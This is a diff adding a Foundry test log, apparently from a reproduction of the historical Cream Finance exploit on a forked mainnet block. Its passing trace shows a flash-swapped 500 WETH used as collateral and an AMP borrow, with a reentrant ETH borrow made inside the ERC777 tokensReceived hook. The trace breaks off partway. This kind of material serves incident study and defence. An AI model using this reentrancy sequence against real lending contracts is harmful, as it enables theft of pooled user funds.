@@ -1,0 +1,319 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Cream_exp.sol:ContractTest
+[PASS] test() (gas: 1018595)
+Logs:
+  Exploit completed, WETH Balance: 109168087922212625919
+
+Traces:
+  [5779] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 13125070 [1.312e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [1160395] ContractTest::test()
+    ├─ [0] 0x0000000000000000000000000000000000000000::fallback{value: 79228162514264337593543950335}()
+    │   └─ ← [Stop]
+    ├─ [27371] ERC1820Registry::setInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ emit InterfaceImplementerSet(addr: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], interfaceHash: 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a, implementer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 0x5f26d313be4d4d4274696a0d96469f83ce337f3d67c7361eca52929486ca33f2: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Stop]
+    ├─ [1086359] UniswapV2Pair::swap(0, 500000000000000000000 [5e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x30783030)
+    │   ├─ [29962] WETH9::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xd3d2E2692501A5c9Ca623199D38826e513033a17], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc0e75612d35d156c6027aa01afe2ad7d80853c95e612a023a4992c7cbe19ff21: 0x00000000000000000000000000000000000000000000037d1216250ff1d39b1d → 0x000000000000000000000000000000000000000000000361f7314e2d02839b1d
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   └─ ← [Return] true
+    │   ├─ [1014178] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 500000000000000000000 [5e20], 0x30783030)
+    │   │   ├─ [9195] WETH9::withdraw(500000000000000000000 [5e20])
+    │   │   │   ├─ [55] ContractTest::receive{value: 500000000000000000000}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 500000000000000000000 [5e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [102468] CEther::mint{value: 500000000000000000000}()
+    │   │   │   ├─ [9892] TripleSlopeRateModel::getBorrowRate(1824106833908118122752 [1.824e21], 4625435318087959774131 [4.625e21], 3462470277093771192 [3.462e18]) [staticcall]
+    │   │   │   │   └─ ← [Return] 51195625523 [5.119e10]
+    │   │   │   ├─ emit AccrueInterest(cashPrior: 1824106833908118122752 [1.824e21], interestAccumulated: 4025634925236722 [4.025e15], borrowIndex: 1114434931648800682 [1.114e18], totalBorrows: 4625439343722885010853 [4.625e21])
+    │   │   │   ├─ [12222] Unitroller::fallback(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   ├─ [7042] Comptroller::mintAllowed(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 500000000000000000000 [5e20], mintTokens: 2417223613775 [2.417e12])
+    │   │   │   ├─ emit Transfer(from: CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2417223613775 [2.417e12])
+    │   │   │   ├─ [1016] Unitroller::fallback(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20], 2417223613775 [2.417e12])
+    │   │   │   │   ├─ [403] Comptroller::mintVerify(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20], 2417223613775 [2.417e12]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 11: 0x0000000000000000000000000000000000000000000000fabecf5331c2c903b3 → 0x0000000000000000000000000000000000000000000000fabedda07cee7fd5a5
+    │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000300d2a5f3f85c7b8 → 0x0000000000000000000000000000000000000000000000003010bdb20a737c34
+    │   │   │   │   @ 13: 0x00000000000000000000000000000000000000000000000000001c57c23f03e9 → 0x00000000000000000000000000000000000000000000000000001e8a90004138
+    │   │   │   │   @ 0x577503ff3bb2b9f068eba56b7e87365512d0bfb917f361765180fd6fc1c8d3af: 0 → 0x00000000000000000000000000000000000000000000000000000232cdc13d4f
+    │   │   │   │   @ 10: 0x0000000000000000000000000000000000000000000000000f7743c89e7330a0 → 0x0000000000000000000000000000000000000000000000000f7744aa7236a7aa
+    │   │   │   │   @ 9: 0x0000000000000000000000000000000000000000000000000000000000c845bd → 0x0000000000000000000000000000000000000000000000000000000000c845ce
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [158822] CEther::borrow(1000000000000000000 [1e18])
+    │   │   │   ├─ [99791] Unitroller::fallback(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18])
+    │   │   │   │   ├─ [99111] Comptroller::borrowAllowed(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]) [delegatecall]
+    │   │   │   │   │   ├─ emit MarketEntered(rToken: CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─ [2901] PriceOracleProxy::getUnderlyingPrice(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   ├─ [4752] CEther::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0, 2417223613775 [2.417e12], 0, 206848881150465064906976491 [2.068e26]
+    │   │   │   │   │   ├─ [901] PriceOracleProxy::getUnderlyingPrice(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 1
+    │   │   │   │   │   │   @ 0x60c5448f9600c8cfb7b7dd0290d6477ddbc2ca3e268dc1cd0c66139cf9abd0cf: 0 → 0x000000000000000000000000d06527d5e56a3495252a528c4987003b712860ee
+    │   │   │   │   │   │   @ 0x545eb7a5f9be021fece779e61a890525d9ebed439349415c59adcb288243e55e: 0 → 1
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [55] ContractTest::receive{value: 1000000000000000000}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 1000000000000000000 [1e18], accountBorrows: 1000000000000000000 [1e18], totalBorrows: 4626439343722885010853 [4.626e21])
+    │   │   │   ├─ [949] Unitroller::fallback(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18])
+    │   │   │   │   ├─ [342] Comptroller::borrowVerify(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa20c45dd8a851b8b8653a17982859bee31b444ff681134f34d4fa90171fb1a2a: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   @ 11: 0x0000000000000000000000000000000000000000000000fabedda07cee7fd5a5 → 0x0000000000000000000000000000000000000000000000faccbe573095e3d5a5
+    │   │   │   │   @ 0xa20c45dd8a851b8b8653a17982859bee31b444ff681134f34d4fa90171fb1a2b: 0 → 0x0000000000000000000000000000000000000000000000000f7744aa7236a7aa
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [54973] CErc20Delegator::accrueInterest()
+    │   │   │   ├─ [49758] CCollateralCapErc20Delegate::accrueInterest() [delegatecall]
+    │   │   │   │   ├─ [14965] TripleSlopeRateModel::getBorrowRate(33663858581302237334110531 [3.366e25], 470166088159676190211552469 [4.701e26], 207252914123973988114735 [2.072e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 384246845119 [3.842e11]
+    │   │   │   │   ├─ emit AccrueInterest(cashPrior: 33663858581302237334110531 [3.366e25], interestAccumulated: 3251877049031349542425 [3.251e21], borrowIndex: 1019747018623347753 [1.019e18], totalBorrows: 470169340036725221561094894 [4.701e26])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000184e98ab5e900fba0c5b4d5 → 0x00000000000000000000000000000000000000000184ea3afec513e4d7e252ee
+    │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000002be333f6fac1080ae12f → 0x000000000000000000000000000000000000000000002c3287f39cdd2da48eba
+    │   │   │   │   │   @ 10: 0x0000000000000000000000000000000000000000000000000e26d8188fd30d79 → 0x0000000000000000000000000000000000000000000000000e26de82b5ceec29
+    │   │   │   │   │   @ 9: 0x0000000000000000000000000000000000000000000000000000000000c845bc → 0x0000000000000000000000000000000000000000000000000000000000c845ce
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [464839] CErc20Delegator::borrow(19480000000000000000000000 [1.948e25])
+    │   │   │   ├─ [464035] CCollateralCapErc20Delegate::borrow(19480000000000000000000000 [1.948e25]) [delegatecall]
+    │   │   │   │   ├─ [235994] Unitroller::fallback(CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25])
+    │   │   │   │   │   ├─ [235314] Comptroller::borrowAllowed(CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25]) [delegatecall]
+    │   │   │   │   │   │   ├─ [35242] CErc20Delegator::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   ├─ [34425] CCollateralCapErc20Delegate::registerCollateral(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [1380] Unitroller::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [706] Comptroller::checkMembership(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] false
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] false
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x21284a7e3d76be98b82878f06f62c3846b9cfd0a98b63099a707264e9650f639: 0 → 1
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ emit MarketEntered(rToken: CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   ├─ [87817] PriceOracleProxy::getUnderlyingPrice(CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2448] CErc20Delegator::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] Amp: [0xfF20817765cB7f73d4bde2e66e067E58D11095C2]
+    │   │   │   │   │   │   │   ├─ [18698] FeedRegistry::latestRoundData(Amp: [0xfF20817765cB7f73d4bde2e66e067E58D11095C2], 0x0000000000000000000000000000000000000348) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [7410] 0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 7568, 5648000 [5.648e6], 1630302179 [1.63e9], 1630302179 [1.63e9], 7568
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709559184 [1.844e19], 5648000 [5.648e6], 1630302179 [1.63e9], 1630302179 [1.63e9], 18446744073709559184 [1.844e19]
+    │   │   │   │   │   │   │   ├─ [2106] FeedRegistry::decimals(Amp: [0xfF20817765cB7f73d4bde2e66e067E58D11095C2], 0x0000000000000000000000000000000000000348) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [298] 0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   ├─ [16698] FeedRegistry::latestRoundData(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [7410] AccessControlledOffchainAggregator::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3535, 315731990000000 [3.157e14], 1630295166 [1.63e9], 1630295166 [1.63e9], 3535
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709555151 [1.844e19], 315731990000000 [3.157e14], 1630295166 [1.63e9], 1630295166 [1.63e9], 18446744073709555151 [1.844e19]
+    │   │   │   │   │   │   │   ├─ [2106] FeedRegistry::decimals(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [298] AccessControlledOffchainAggregator::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [9664] FiatTokenProxy::fallback() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2381] FiatTokenV2_1::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   ├─ [341] Amp::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 17832542795200 [1.783e13]
+    │   │   │   │   │   │   ├─ [3427] CEther::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 2417223613775 [2.417e12], 1000000000000000000 [1e18], 206848881150465064906976491 [2.068e26]
+    │   │   │   │   │   │   ├─ [901] PriceOracleProxy::getUnderlyingPrice(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   │   ├─ [10051] CErc20Delegator::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [8548] CErc20Delegator::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [6663] CCollateralCapErc20Delegate::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 200197219122908640304245949 [2.001e26]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a59968feb3c75c20d52cbd
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 200197219122908640304245949 [2.001e26]
+    │   │   │   │   │   │   ├─ [26817] PriceOracleProxy::getUnderlyingPrice(CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [448] CErc20Delegator::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] Amp: [0xfF20817765cB7f73d4bde2e66e067E58D11095C2]
+    │   │   │   │   │   │   │   ├─ [4198] FeedRegistry::latestRoundData(Amp: [0xfF20817765cB7f73d4bde2e66e067E58D11095C2], 0x0000000000000000000000000000000000000348) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1410] 0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 7568, 5648000 [5.648e6], 1630302179 [1.63e9], 1630302179 [1.63e9], 7568
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709559184 [1.844e19], 5648000 [5.648e6], 1630302179 [1.63e9], 1630302179 [1.63e9], 18446744073709559184 [1.844e19]
+    │   │   │   │   │   │   │   ├─ [2106] FeedRegistry::decimals(Amp: [0xfF20817765cB7f73d4bde2e66e067E58D11095C2], 0x0000000000000000000000000000000000000348) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [298] 0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   ├─ [4198] FeedRegistry::latestRoundData(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1410] AccessControlledOffchainAggregator::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3535, 315731990000000 [3.157e14], 1630295166 [1.63e9], 1630295166 [1.63e9], 3535
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709555151 [1.844e19], 315731990000000 [3.157e14], 1630295166 [1.63e9], 1630295166 [1.63e9], 18446744073709555151 [1.844e19]
+    │   │   │   │   │   │   │   ├─ [2106] FeedRegistry::decimals(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [298] AccessControlledOffchainAggregator::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [1164] FiatTokenProxy::fallback() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [381] FiatTokenV2_1::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   ├─ [341] Amp::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 17832542795200 [1.783e13]
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x4026bdf937281dd950d010c8348076c63dc522c29695081040c32a2185767967: 0 → 1
+    │   │   │   │   │   │   │   @ 0x60c5448f9600c8cfb7b7dd0290d6477ddbc2ca3e268dc1cd0c66139cf9abd0d0: 0 → 0x0000000000000000000000002db6c82ce72c8d7d770ba1b5f5ed0b6e075066d6
+    │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 1 → 2
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [169890] Amp::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25])
+    │   │   │   │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], 0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   ├─ [42622] ContractTest::tokensReceived(0xa9059cbb, 0x0000000000000000000000000000000000000000000000000000000000000000, CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25], 0x, 0x)
+    │   │   │   │   │   │   ├─ [39880] CEther::borrow(354000000000000000000 [3.54e20])
+    │   │   │   │   │   │   │   ├─ [22074] Unitroller::fallback(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20])
+    │   │   │   │   │   │   │   │   ├─ [21394] Comptroller::borrowAllowed(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [901] PriceOracleProxy::getUnderlyingPrice(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   ├─ [3427] CEther::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 2417223613775 [2.417e12], 1000000000000000000 [1e18], 206848881150465064906976491 [2.068e26]
+    │   │   │   │   │   │   │   │   │   ├─ [901] PriceOracleProxy::getUnderlyingPrice(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   ├─ [6051] CErc20Delegator::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [4548] CErc20Delegator::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [2663] CCollateralCapErc20Delegate::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 200197219122908640304245949 [2.001e26]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a59968feb3c75c20d52cbd
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 200197219122908640304245949 [2.001e26]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [55] ContractTest::receive{value: 354000000000000000000}()
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 354000000000000000000 [3.54e20], accountBorrows: 355000000000000000000 [3.55e20], totalBorrows: 4980439343722885010853 [4.98e21])
+    │   │   │   │   │   │   │   ├─ [949] Unitroller::fallback(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20])
+    │   │   │   │   │   │   │   │   ├─ [342] Comptroller::borrowVerify(CEther: [0xD06527D5e56A3495252A528C4987003b712860eE], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 11: 0x0000000000000000000000000000000000000000000000faccbe573095e3d5a5 → 0x00000000000000000000000000000000000000000000010dfd7afb9e0e2bd5a5
+    │   │   │   │   │   │   │   │   @ 0xa20c45dd8a851b8b8653a17982859bee31b444ff681134f34d4fa90171fb1a2a: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000000133e9d5b211fac0000
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Transfer(from: CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19480000000000000000000000 [1.948e25])
+    │   │   │   │   │   ├─ emit TransferByPartition(fromPartition: 0x0000000000000000000000000000000000000000000000000000000000000000, operator: CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], from: CErc20Delegator: [0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19480000000000000000000000 [1.948e25], data: 0x, operatorData: 0x)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0eceb1b9feb652a10f88a38f22ed704e8e68735faf01049a4552285c000b4718: 0x0000000000000000000000000000000000000000001bd8996e2eff8269f88143 → 0x0000000000000000000000000000000000000000000bbb8c83aff6de0af88143
+    │   │   │   │   │   │   @ 0xc4f5170058ce377edd9da1023629340dd154fa15ac50f7626e508bf2f203667b: 0x0000000000000000000000000000000000000000001bd8996e2eff8269f88143 → 0x0000000000000000000000000000000000000000000bbb8c83aff6de0af88143
+    │   │   │   │   │   │   @ 0xdbbde71e1a4080345235257e965b73612794cf3c85775e62f0a4e44906b67515: 0 → 1
+    │   │   │   │   │   │   @ 0x28771ffa18a1f355b0acb3c2b96320d7d689d5a4ff51cb1926883e6fa255c0ef: 0 → 1
+    │   │   │   │   │   │   @ 0xd71c5065f44c4a0800fa9336624a57623dfb9a93f190d91ebb292fe3084224b4: 0 → 0x000000000000000000000000000000000000000000101d0cea7f08a45f000000
